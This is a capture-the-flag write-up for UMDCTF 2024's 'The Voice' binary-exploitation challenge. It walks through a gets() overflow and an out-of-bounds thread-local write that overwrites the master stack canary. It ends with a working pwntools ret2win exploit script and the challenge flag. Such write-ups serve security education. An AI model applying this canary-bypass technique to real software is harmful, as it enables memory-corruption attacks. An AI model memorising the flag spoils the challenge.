---
linkTitle: The Voice
title: The Voice [Writeup]
type: docs
math: True
weight: 1
---
## Challenge Description

> If you want the flag, command me to give it to you.

## Challenge Files
```c {filename=the_voice.c, linenos=table}
#include <stdio.h>
#include <stdlib.h>

__thread long long g[10];

void give_flag() {
    char buf[100];
    FILE* f = fopen("flag.txt", "r");
    fgets(buf, sizeof(buf), f);
    printf("%s\n", buf);
}

int main() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);  

    puts("If you want the flag, command me to give it to you.");
    char command[16];
    
    gets(command);
    g[atoi(command)] = 10191;
}
```

## Solution 
Before inspecting the source code, let us first run `checksec` on the provided binary to look out for the security mitigations applied on this binary. 
```shell
fooker@fooker:~/ctfs/umdctf2024/the_voice$ checksec the_voice
[*] '~/ctfs/umdctf2024/the_voice/the_voice'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
As shown in the above code snippet, the binary has no PIE enabled (the binary isn't a position independent executable). However, the binary has 
a `Stack Canary` enabled which implies that we must defeat this stack protection if we were to corrupt return addresses. Anyway, we could start examining the source code in search for any visible vulnerabilities. 

### Buffer Overflow at Line 21
There's an immediate buffer overflow vulnerability at `Line 21`. The source code uses the `gets()` function to read into the buffer `command`. However, `gets()` does not limit the number of bytes read into a buffer and hence we could easily overflow this buffer. Let's compute the offset of the pointer `*command` from the stack base pointer `rbp`. 

I'm gonna read in `8` bytes of garbage into the buffer and then set a break-point and then inspect the stack immediately after. 

```bash
───────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────
00:0000│ rcx rsp 0x7fffffffd870 ◂— 'AAAAAAAA'
01:0008│-018     0x7fffffffd878 ◂— 0x0
02:0010│-010     0x7fffffffd880 ◂— 0x1000
03:0018│-008     0x7fffffffd888 ◂— 0xac5f323021c39c00
04:0020│ rbp     0x7fffffffd890 ◂— 0x1
05:0028│+008     0x7fffffffd898 —▸ 0x7ffff7dabd90 (__libc_start_call_main+128) ◂— mov edi, eax
06:0030│+010     0x7fffffffd8a0 ◂— 0x0
07:0038│+018     0x7fffffffd8a8 —▸ 0x401266 (main) ◂— endbr64
─────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────
 ► 0         0x4012eb main+133
   1   0x7ffff7dabd90 __libc_start_call_main+128
   2   0x7ffff7dabe40 __libc_start_main+128
   3         0x401135 _start+37
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg>

```

From the above snippet, we can deduce that the pointer `*command` is at `rbp - 0x20`, which is `32` bytes below the base pointer. Recall that since the binary isn't a Position Independent Executable, therefore we could retrieve the address of the `give_flag()` function from the binary and perform a `ret2win` attack. However, we must defeat the stack canary mitigation before doing that.  

### Stack Canary Protection
This is honestly a cool and mind-blowing technique to defeat the stack canary. Before we get into how to bypass the stack canary, let's try to look out for all the stack canaries in our binary at the breakpoint we set above. 

```bash
pwndbg> canary
AT_RANDOM = 0x7fffffffdc09 # points to (not masked) global canary value
Canary    = 0xac5f323021c39c00 (may be incorrect on != glibc)
Found valid canaries on the stacks:
00:0000│-008 0x7fffffffd888 ◂— 0xac5f323021c39c00
00:0000│+098 0x7fffffffd928 ◂— 0xac5f323021c39c00
pwndbg>

```
So here we can see something known as the `global canary value`. As it turns out, when the stack canary protection is enabled in a binary, the C runtime initialisation invokes the creation of the canary value. The canary is random bytes generated by the kernel with the least significant byte replaced by a `0`. This is another protection for prevention of canary leaks. The canary initialised is actually the global canary value or the master canary in a program, which is stored in the TCB (Thread Control Block). On the i386 architecture, the global canary is stored at `gs:0x14`, and on x86_64, at `fs:0x28`. We could easily verify this from the disassembly of the binary. 

```bash
pwndbg> disass main
Dump of assembler code for function main:
   0x0000000000401266 <+0>:     endbr64
   0x000000000040126a <+4>:     push   rbp
   0x000000000040126b <+5>:     mov    rbp,rsp
   0x000000000040126e <+8>:     sub    rsp,0x20
   0x0000000000401272 <+12>:    mov    rax,QWORD PTR fs:0x28
   0x000000000040127b <+21>:    mov    QWORD PTR [rbp-0x8],rax
```

As seen above, during the initilisation of a new stack frame, a seemingly mysterious value is copied from `fs:0x28` and stored into the location `[rbp - 0x8]`. This is nothing but the stack canary! The stack canary protection works as follows:

```bash
   0x00000000004012eb <+133>:   mov    QWORD PTR fs:[rax*8-0x50],0x27cf
   0x00000000004012f8 <+146>:   mov    eax,0x0
   0x00000000004012fd <+151>:   mov    rdx,QWORD PTR [rbp-0x8]
   0x0000000000401301 <+155>:   sub    rdx,QWORD PTR fs:0x28
   0x000000000040130a <+164>:   je     0x401311 <main+171>
   0x000000000040130c <+166>:   call   0x4010b0
   0x0000000000401311 <+171>:   leave
   0x0000000000401312 <+172>:   ret
```

Right before the stack frame is popped off, the value loaded from `fs:0x28` is compared against the value stored in `[rbp-0x8]`. If these two values match then the program continues an expected flow of instruction. However, if a modification is detected the program calls `__stack_chk_fail@plt` from the `PLT (Procedure Linkage Table)` and the program terminates with the message `*** stack smashing detected ***`

### Overwriting the Master Canary

Now that we know how the stack protection works, we shall try to exploit this. Firstly, let's take a look at the assembly corresponding to `Line 22` in the source code. 

```bash
   0x00000000004012eb <+133>:   mov    QWORD PTR fs:[rax*8-0x50],0x27cf  ## g[atoi(command)] = 10191;
```
The takeaway is that `0x27cf` is loaded in the location `fs:[rax*8-0x50]`. If we could load this into `fs:0x28` this would overwrite the master canary and then we could craft the `ret2win` attack. Inspecting the assembly a bit more 

```bash
   0x00000000004012dd <+119>:   lea    rax,[rbp-0x20]
   0x00000000004012e1 <+123>:   mov    rdi,rax
   0x00000000004012e4 <+126>:   call   0x401100
   0x00000000004012e9 <+131>:   cdqe
```

we conclude that if we could load `(0x28 + 0x50) // 8` into `[rbp - 0x20]` we could force the program to overwrite the master canary! And we shall do exactly that in the following exploit!

```py {filename=exploit.py, linenos=table}
#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './the_voice'
elf = context.binary = ELF(exe, checksec=True)

context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]

host, port = 'challs.umdctf.io', 31192

def initialize(argv=[]):
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

r = initialize()

# =========================================================
#                         EXPLOITS
# =========================================================

payload = flat({
    0x00: b'15', 
    0x18: 0x27cf,
    0x28: elf.sym['give_flag']
})

r.sendlineafter(b"If you want the flag, command me to give it to you.", payload)
r.recvline()

r.interactive()
```

## Flag
```
UMDCTF{pwn_g3ss3r1t_sk1ll5_d0nt_tak3_a5_many_y3ar5_t0_l3arn_pau1}
```
